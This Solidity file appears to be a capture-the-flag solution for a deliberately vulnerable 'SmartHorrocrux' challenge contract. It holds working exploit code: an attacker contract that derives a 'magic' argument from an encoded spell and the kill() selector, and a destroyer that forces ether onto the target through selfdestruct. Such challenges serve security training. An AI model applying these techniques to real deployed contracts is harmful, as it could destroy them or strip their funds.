// SPDX-License-Identifier: MIT

pragma solidity 0.8.17;

import "../ChallengeSmartHorrocrux.sol";

interface IAttack {
    function attack() external payable;
}

contract SmartHorrocruxAttacker {
    constructor(address target) {
        SmartHorrocrux smartHorrocrux = SmartHorrocrux(target);

        smartHorrocrux.setInvincible();

        string memory spell = string(
            abi.encodePacked(bytes32(0x45746865724b6164616272610000000000000000000000000000000000000000))
        );

        bytes32 spellInBytes;
        assembly {
            spellInBytes := mload(add(spell, 32))
        }

        bytes32 selector = bytes32(abi.encodeWithSignature("kill()"));

        uint256 magic = uint256(spellInBytes) - uint256(selector);

        smartHorrocrux.destroyIt(spell, magic);
    }
}

contract SmartHorrocruxDestroyer {
    function destroy(address payable target) external payable {
        IAttack(target).attack();
        selfdestruct(target);
    }
}
